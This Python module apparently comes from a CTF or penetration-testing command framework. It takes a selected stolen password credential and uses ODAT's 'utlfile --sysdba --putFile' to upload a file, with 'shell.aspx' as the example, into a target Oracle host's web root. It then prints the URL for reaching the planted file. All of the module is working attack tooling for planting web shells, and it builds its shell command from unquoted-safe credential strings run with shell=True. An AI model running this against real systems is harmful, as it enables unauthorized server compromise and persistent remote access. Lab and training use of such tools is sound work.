import subprocess
from pathlib import Path


PROVIDES = []
REQUIRES = ["ip"]


def run(data, cred, args):

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    W = '\033[0m'
    R = '\033[91m'
    M = '\033[95m'

    reference = getattr(
        args,
        "reference",
        False
    )

    # -----------------------------
    # REFERENCE
    # -----------------------------

    if reference:

        print(
            f"\n{B}┌── REFERENCE "
            f"──────────────────────────────────────┐{W}"
        )

        print()

        print(
            f"{Y}odat utlfile "
            f"-s {M}<IP>{W} "
            f"-d {M}<SID>{W} "
            f"-U {M}<USER>{W} "
            f"-P {M}<PASS>{W} "
            f"--sysdba "
            f"--putFile "
            f"{M}<WEBROOT>{W} "
            f"{M}<REMOTE>{W} "
            f"{M}<LOCAL>{W}"
        )

        print()

        print(
            f"{Y}curl "
            f"http://{M}<IP>{W}/{M}<FILE>{W}"
        )

        print(
            f"\n{B}└──────────────────────────────────────────────┘{W}\n"
        )

        return

    # -----------------------------
    # TARGET
    # -----------------------------

    ip = data.get("ip")

    if not ip:

        print(
            f"\n{R}[!]{W} "
            f"No target IP loaded."
        )

        return

    # -----------------------------
    # FILE
    # -----------------------------

    if (
        not getattr(args, "extra", None)
        or not args.extra
    ):

        print(
            f"\n{R}[!]{W} "
            f"File required."
        )

        print(
            f"{Y}ctf oracle.upload shell.aspx{W}\n"
        )

        return

    local_file = Path(
        args.extra[0]
    ).expanduser().resolve()

    if not local_file.exists():

        print(
            f"\n{R}[!]{W} "
            f"File not found:"
        )

        print(
            f"{C}{local_file}{W}\n"
        )

        return

    remote_name = (
        local_file.name
    )

    # -----------------------------
    # CREDS
    # -----------------------------

    creds = data.get(
        "creds",
        []
    )

    current_index = data.get(
        "current_cred"
    )

    if (
        current_index is None
        or current_index >= len(creds)
    ):

        print(
            f"\n{R}[!]{W} "
            f"No credential selected."
        )

        return

    current = creds[
        current_index
    ]

    if current.get(
        "type"
    ) != "password":

        print(
            f"\n{R}[!]{W} "
            f"Oracle upload requires "
            f"a password credential."
        )

        return

    user = current.get(
        "user"
    )

    password = current.get(
        "secret"
    )

    # -----------------------------
    # SID
    # -----------------------------

    sid = input(
        "\nSID [XE]: "
    ).strip()

    if not sid:

        sid = "XE"

    # -----------------------------
    # OS
    # -----------------------------

    os_name = data.get(
        "os"
    )

    if not os_name:

        print(
            f"\n{B}[{W}{G}*{W}{B}]{W} "
            f"TARGET OS\n"
        )

        print(
            f"{C}[1]{W} Windows"
        )

        print(
            f"{C}[2]{W} Linux\n"
        )

        choice = input(
            "> "
        ).strip()

        if choice == "1":

            os_name = "windows"

        else:

            os_name = "linux"

    # -----------------------------
    # DEFAULT WEBROOT
    # -----------------------------

    if (
        str(os_name)
        .lower()
        .startswith("win")
    ):

        remote_dir = (
            r"C:\inetpub\wwwroot"
        )

    else:

        remote_dir = (
            "/var/www/html"
        )

    print(
        f"\n{B}[{W}{G}*{W}{B}]{W} "
        f"TARGET DIRECTORY\n"
    )

    print(
        f"{C}{remote_dir}{W}\n"
    )

    custom = input(
        "Press Enter to continue "
        "or enter custom path: "
    ).strip()

    if custom:

        remote_dir = custom

    # -----------------------------
    # COMMAND
    # -----------------------------

    cmd = (
        f"odat utlfile "
        f"-s {ip} "
        f"-d {sid} "
        f"-U '{user}' "
        f"-P '{password}' "
        f"--sysdba "
        f"--putFile "
        f"'{remote_dir}' "
        f"'{remote_name}' "
        f"'{local_file}'"
    )

    # -----------------------------
    # HEADER
    # -----------------------------

    print(
        f"\n{B}┌── MODULE: ORACLE UPLOAD "
        f"──────────────────────┐{W}"
    )

    print(
        f"{B}│{W} "
        f"TARGET: "
        f"{C}{ip:<38}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W} "
        f"USER:   "
        f"{C}{user:<38}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W} "
        f"SID:    "
        f"{C}{sid:<38}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└───────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{B}[{W}{G}*{W}{B}]{W} "
        f"COMMAND\n"
    )

    print(
        f"{Y}{cmd}{W}\n"
    )

    # -----------------------------
    # EXECUTE
    # -----------------------------

    try:

        subprocess.run(
            cmd,
            shell=True
        )

    except KeyboardInterrupt:

        print(
            f"\n{R}[!]{W} "
            f"Upload cancelled."
        )

        return

    # -----------------------------
    # URL
    # -----------------------------

    print()

    print(
        f"{G}[+]{W} "
        f"Possible URL:"
    )

    print()

    print(
        f"{C}http://{ip}/{remote_name}{W}"
    )

    print()
